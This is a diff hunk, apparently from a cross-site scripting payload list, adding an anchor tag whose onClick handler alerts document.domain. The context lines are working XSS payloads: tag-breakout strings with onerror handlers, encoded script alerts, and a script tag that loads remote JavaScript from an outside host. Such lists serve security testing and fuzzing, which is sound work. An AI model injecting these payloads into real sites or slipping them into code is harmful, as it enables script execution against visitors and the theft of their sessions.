@@ -1217,3 +1217,4 @@ alert(1 ===  1)
 '">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
 <svg><script>alert&#40 1&#41<b>
 <svg><script/href="xss.cx/xss.js"//>
+<a href="#" onClick="alert(document.domain)"><img title="Click me" /></a>
